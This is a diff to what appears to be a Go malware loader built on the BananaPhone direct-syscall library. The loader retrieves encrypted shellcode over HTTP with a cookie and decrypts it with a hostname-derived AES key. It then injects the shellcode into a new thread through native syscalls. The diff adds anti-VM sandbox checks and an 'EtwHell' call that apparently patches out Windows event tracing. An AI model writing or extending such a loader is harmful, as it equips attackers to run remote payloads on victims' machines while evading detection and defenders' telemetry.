@@ -30,6 +30,7 @@ var (
 // https://github.com/C-Sto/BananaPhone
 
 func main() {
+	malwareUtil.VmCheck()
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	sleepTime, _ = strconv.Atoi(conf[2])
@@ -53,11 +54,7 @@ func main() {
 		body, err = malwareUtil.Request(cookieName, conf)
 		// if the response is not a shellcode, sleep and try again
 		if len(body) < 10 {
-			t, _ := strconv.Atoi(string(body))
-			malwareUtil.Sleep(t)
-			if err != nil || len(body) == 0 {
-				malwareUtil.Sleep(sleepTime)
-			}
+			malwareUtil.Sleep(sleepTime)
 		} else {
 			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
 			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
@@ -74,7 +71,7 @@ func main() {
 				malwareUtil.Sleep(sleepTime)
 			}
 		}
-		//fmt.Println(body)
+		//fmt.Println("body :", string(body))
 	}
 }
 
@@ -91,6 +88,7 @@ func inject(shellcode []byte) {
 }
 
 func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid, NtWaitForSingleObject uint16) {
+	malwareUtil.EtwHell(handle)
 	var baseA uintptr
 	regionsize := uintptr(len(shellcode))
 	bananaphone.Syscall(
